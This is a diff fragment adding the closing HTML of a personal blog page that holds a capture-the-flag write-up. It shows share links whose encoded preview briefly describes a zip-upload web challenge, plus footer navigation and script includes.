+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&name=TFC%20CTF%20Writeup&description=%3cp%3eOut%20of%207%20challenges%2c%20I%20have%20tried%20out%202%20challenges%20and%20was%20able%20to%20solve%20only%20one%20challenge.%20Challenges%20are%20bit%20tricky%20compated%20to%20other%20CTFs%20i%20have%20played%20so%20far.%3c%2fp%3e%0a%3ch1%20id%3d%22challenge-web-slippy%22%3eChallenge%3a%20Web-slippy%3c%2fh1%3e%0a%3cp%3eThis%20challenge%20allows%20user%20to%20upload%20zip%20files.%20After%20cheking%20the%20index.js%20file%20i%20found%20that%20i%20need%20to%20access%20%3ccode%3e%2fdebug%2ffiles%3c%2fcode%3e.%3c%2fp%3e%0a%3cimg%20src%3d%22%2fimg%2ftfcctf_1.png%22%20width%3d%22700%22%20height%3d%22700%22%20alt%3d%22image%201%22%20class%3d%22rounded-image%22%3e%0d%0a%3cp%3eHere%20in%20line%2068%2c%20user%20can%20pass%20query%20parameter%20%28session_id%29%20in%20the%20url%20and%20contents%20of%20query%20parameter%20will%20be%20appended%20to%20..%2fuploads%20but%20only%20allowed%20from%20%3ccode%3e127.0.0.1%3c%2fcode%3e%20and%20user%20should%20be%20%3ccode%3edevelop%3c%2fcode%3e.%3c%2fp%3e" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fyashwanth164.github.io%2fblog.v3loz1ty%2fposts%2fctf%2ftfc_webchall_writeup%2f&t=TFC%20CTF%20Writeup" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2025  v3loz1ty 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/">Home</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts">All posts</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/posts/ctf">CTF writeups</a></li>
+         
+        <li><a href="https://yashwanth164.github.io/blog.v3loz1ty/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=https://yashwanth164.github.io/blog.v3loz1ty/lib/font-awesome/css/all.min.css>
+<script src=https://yashwanth164.github.io/blog.v3loz1ty/lib/jquery/jquery.min.js></script>
+<script src=https://yashwanth164.github.io/blog.v3loz1ty/js/main.js></script>
+
+<script src=https://yashwanth164.github.io/blog.v3loz1ty/js/code-copy.js></script>
+
+
+
+
+</html>
